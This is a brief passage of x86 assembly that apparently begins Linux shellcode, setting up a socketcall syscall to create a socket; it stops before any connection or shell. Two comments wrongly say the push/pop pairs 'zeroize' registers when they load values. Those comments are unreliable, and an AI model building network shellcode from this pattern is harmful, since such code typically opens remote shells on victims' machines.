global _start

section .text

_start:

  push 0x66 ; syscall sys_socketcall for creating socket
  pop eax   ; zeroize EAX register
  
  push 0x1  ; sys_socket call
  pop ebx   ; zeroize EBX register
